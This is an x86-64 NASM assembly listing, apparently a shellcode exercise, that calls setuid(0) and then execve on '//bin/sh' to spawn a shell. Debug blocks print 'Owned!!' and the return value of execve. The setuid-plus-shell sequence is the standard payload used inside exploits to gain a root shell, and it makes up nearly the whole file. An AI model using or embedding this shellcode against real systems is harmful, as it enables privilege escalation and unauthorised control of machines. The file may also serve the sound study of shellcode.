     1                                  extern	printf
     2                                  
     3                                  section .data
     4                                  
     5 00000000 4F776E656421210A        msg db 'Owned!!',0xa
     6 00000008 7261783D256C640A00      fmt    db "rax=%ld", 10, 0
     7                                  
     8                                  
     9                                  section .text
    10                                  
    11                                  ;global _start
    12                                  
    13                                  ;_start:
    14                                  global main
    15                                  main:
    16                                  
    17                                  ; setuid(uid_t uid)
    18 00000000 4831C0                  xor rax, rax	;initialise rax and rdi
    19 00000003 B069                    mov al, 105
    20 00000005 4831FF                  xor rdi, rdi
    21 00000008 0F05                    syscall		; sys_setuid -- setuid(0)
    22 0000000A 4831C0                  xor rax, rax	; clean rax from the returned value
    23                                  
    24                                  ;;;;;;;;;;;;;;;;;;;CHECK-CODE;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    25 0000000D B001                    mov al,1
    26 0000000F BF01000000              mov rdi,1
    27 00000014 48BE-                   mov rsi,msg
    28 00000016 [0000000000000000] 
    29 0000001E BA08000000              mov rdx,8
    30 00000023 0F05                    syscall
    31 00000025 4831FF                  xor rdi,rdi
    32 00000028 4831C0                  xor rax, rax
    33                                  ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    34                                  
    35                                  
    36                                  ;int execve(const char *filename, char *const argv[], char *const envp[])
    37                                  
    38                                  ;push NULL  to get ready for execve the argv[] needs to terminate with NULL
    39 0000002B 57                      push rdi	;rdi = NULL from before
    40                                  
    41                                  ;	mov rdx, rsp;rdx the 3rd arg points to NULL
    42                                  
    43                                  ;push "//bin/sh" on stack to get ready for execve
    44                                  ;"//bin/sh" = 2f, 2f, 62, 69,   6e, 2f, 73, 68
    45                                  
    46 0000002C 682F2F6269              push 0x69622f2f
    47 00000031 C74424046E2F7368        mov dword [rsp+4], 0x68732f6e
    48                                  
    49 00000039 4889E7                  mov rdi, rsp	;rdi points to the start of the string on stack
    50                                  ;	mov rsi, rdi	;rsi points to the start of the array of strs ending with a null pointer
    51 0000003C 4883C410                add rsp, 16	;restore stack
    52                                  ;	xor rdx, rdx	;envp[] = NULL we dont have environment something
    53                                  
    54 00000040 B03B                    mov al, 59	;set rax for syscall
    55 00000042 0F05                    syscall
    56                                  
    57                                  ;;;;;;;;;;;;;;;;;;;CHECK-CODE;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    58                                  ;print retur value of execve
    59 00000044 55                      push	rbp
    60 00000045 48BF-                   mov rdi, fmt
    61 00000047 [0800000000000000] 
    62 0000004F 4889C6                  mov rsi, rax
    63 00000052 4831C0                  xor rax, rax
    64 00000055 E8(00000000)            call printf
    65 0000005A 5D                      pop	rbp
    66                                  ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    67                                  
    68 0000005B 4831C0                  xor rax, rax	;clean rax from the returned value
    69                                  
    70                                  ;;;;;;;;;;;;;;;;;;;CHECK-CODE;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    71 0000005E 4831C0                  xor rax, rax
    72 00000061 B001                    mov al,1
    73 00000063 BF01000000              mov rdi,1
    74 00000068 48BE-                   mov rsi,msg
    75 0000006A [0000000000000000] 
    76 00000072 BA08000000              mov rdx,8
    77 00000077 0F05                    syscall
    78 00000079 4831FF                  xor rdi,rdi
    79 0000007C 4831C0                  xor rax, rax
    80                                  ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    81                                  
    82                                  
    83                                  ;exit(int status)
    84 0000007F B03C                    mov al, 60	;set rax for syscall
    85 00000081 4831FF                  xor rdi, rdi	;set status on 0
    86 00000084 0F05                    syscall
    87                                  
